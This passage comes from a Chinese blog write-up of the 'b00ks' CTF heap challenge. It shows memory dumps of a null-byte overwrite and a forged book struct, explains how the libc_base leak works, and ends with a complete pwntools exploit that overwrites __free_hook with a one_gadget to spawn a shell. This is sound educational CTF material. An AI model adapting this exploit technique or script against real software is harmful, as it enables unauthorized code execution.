<h5 id="空字节覆盖"><a href="#空字节覆盖" class="headerlink" title="空字节覆盖"></a>空字节覆盖</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x557649c66040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x557649c66050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x557649c66060:	0x000055764b977100	0x000055764b977190</span><br></pre></td></tr></table></figure>

<h5 id="伪造b00k"><a href="#伪造b00k" class="headerlink" title="伪造b00k"></a>伪造b00k</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x55764b9770f0:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x55764b977100:	0x0000000000000001	0x000055764b977198 ----</span><br><span class="line">0x55764b977110:	0x000055764b9771a0	0x000000000000ffff	   |</span><br><span class="line">0x55764b977120:	0x0000000000000000	0x0000000000000000     |</span><br><span class="line">0x55764b977130:	0x0000000000000000	0x0000000000000000     |</span><br><span class="line">0x55764b977140:	0x0000000000000000	0x0000000000000000     |</span><br><span class="line">0x55764b977150:	0x0000000000000000	0x0000000000000031     |</span><br><span class="line">0x55764b977160:	0x0000000000000001	0x000055764b977020     |</span><br><span class="line">0x55764b977170:	0x000055764b977050	0x00000000000000ff     |</span><br><span class="line">0x55764b977180:	0x0000000000000000	0x0000000000000031     |</span><br><span class="line">0x55764b977190:	0x0000000000000002	0x00007f4c77d67010 &lt;-- |</span><br><span class="line">0x55764b9771a0:	0x00007f4c77b847a8	0x0000000000021000</span><br></pre></td></tr></table></figure>

<p>因为第二次申请了很大的chunk，所以程序会使用mmap来进行堆的申请，所以<code>second b00k</code>的<code>name pointer</code>和<code>description pointer</code>的指针可以用来泄露libc_base</p>
<h5 id="泄露libc-base"><a href="#泄露libc-base" class="headerlink" title="泄露libc_base"></a>泄露libc_base</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">payload&#x3D;&#39;a&#39;*0xb0+p64(0x1)+p64(books_one+0x38)+p64(books_one+0x40)+p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">change(payload)</span><br><span class="line"></span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;Name: &#39;)</span><br><span class="line">name_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">description_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;name_addr:&#39; +hex(name_addr))</span><br><span class="line">print(&#39;description_addr:&#39; +hex(description_addr))</span><br><span class="line">#libc_base&#x3D;description_addr-0x587010</span><br><span class="line">libc_base&#x3D;name_addr-0x5a9010</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br></pre></td></tr></table></figure>

<h5 id="获取指针"><a href="#获取指针" class="headerlink" title="获取指针"></a>获取指针</h5><p>我们还需要获取__free_hook指针和execve（‘/bin/sh’）的偏移，这里我们用one_gadget来获取。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">free_hook&#x3D;libc.symbols[&#39;__free_hook&#39;]+libc_base</span><br><span class="line">execve_addr&#x3D;libc_base+offset</span><br></pre></td></tr></table></figure>

<h5 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h5><p>最后我们只需要通过修改我们伪造的b00k1的description为free_hook的指针地址，将b00k2的description填入execve的地址，然后delete b00k2就好了。</p>
<h4 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line"># coding&#x3D;&#39;utf-8&#39;</span><br><span class="line">from pwn import *</span><br><span class="line">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class="line">sh&#x3D;process(&#39;.&#x2F;b00ks&#39;)</span><br><span class="line">libc&#x3D;ELF(&#39;.&#x2F;libc.so.6&#39;)</span><br><span class="line"></span><br><span class="line">def create(name_size,name,des_size,description):</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(str(1))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(name_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(name)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(des_size))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(description)</span><br><span class="line"></span><br><span class="line">def delete (number) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(str(2))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(number))</span><br><span class="line"></span><br><span class="line">def edit(number,data) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;3&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(str(number))</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(data)</span><br><span class="line"></span><br><span class="line">def printf () :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;4&#39;)</span><br><span class="line"></span><br><span class="line">def change (payload) :</span><br><span class="line">        sh.recvuntil(&#39;&gt;&#39;)</span><br><span class="line">        sh.sendline(&#39;5&#39;)</span><br><span class="line">        sh.recvuntil(&#39;:&#39;)</span><br><span class="line">        sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(&#39;:&#39;)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(30,&#39;bb&#39;,255,&#39;cc&#39;)</span><br><span class="line">create(0x21000,&#39;bb&#39;,0x21000,&#39;cc&#39;)</span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;a&#39;*32)</span><br><span class="line">books_one&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;books_one:&#39; +hex(books_one))</span><br><span class="line"></span><br><span class="line">payload&#x3D;&#39;a&#39;*0xb0+p64(0x1)+p64(books_one+0x38)+p64(books_one+0x40)+p64(0xffff)</span><br><span class="line">edit(1,payload)</span><br><span class="line">payload&#x3D;&#39;a&#39;*32</span><br><span class="line">change(payload)</span><br><span class="line"></span><br><span class="line">printf()</span><br><span class="line">sh.recvuntil(&#39;Name: &#39;)</span><br><span class="line">name_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">sh.recvuntil(&#39;Description: &#39;)</span><br><span class="line">description_addr&#x3D;u64(sh.recv(6).ljust(8,&#39;\x00&#39;))</span><br><span class="line">print (&#39;name_addr:&#39; +hex(name_addr))</span><br><span class="line">print(&#39;description_addr:&#39; +hex(description_addr))</span><br><span class="line">#libc_base&#x3D;description_addr-0x587010</span><br><span class="line">libc_base&#x3D;name_addr-0x5a9010</span><br><span class="line">print(&#39;libc_base:&#39; +hex(libc_base))</span><br><span class="line"></span><br><span class="line">#offset&#x3D;0x45216</span><br><span class="line">offset&#x3D;0x4526a</span><br><span class="line">free_hook&#x3D;libc.symbols[&#39;__free_hook&#39;]+libc_base</span><br><span class="line">execve_addr&#x3D;libc_base+offset</span><br><span class="line">print(&#39;free_hook:&#39; +hex(free_hook))</span><br><span class="line">print(&#39;execve_addr:&#39; +hex(execve_addr))</span><br><span class="line"></span><br><span class="line">payload&#x3D;p64(free_hook)</span><br><span class="line">edit(1,payload)</span><br><span class="line">payload&#x3D;p64(execve_addr)</span><br><span class="line">edit(2,payload)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">delete(2)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p>参考:<a href="http://noonegroup.xyz/posts/1a1c1b4a/" target="_blank" rel="noopener external nofollow noreferrer">http://noonegroup.xyz/posts/1a1c1b4a/</a></p>
<p>参考:<a href="https://bbs.pediy.com/thread-225611.htm" target="_blank" rel="noopener external nofollow noreferrer">https://bbs.pediy.com/thread-225611.htm</a></p>
]]></content>
      <categories>
        <category>pwn</category>
        <category>heap</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
</search>
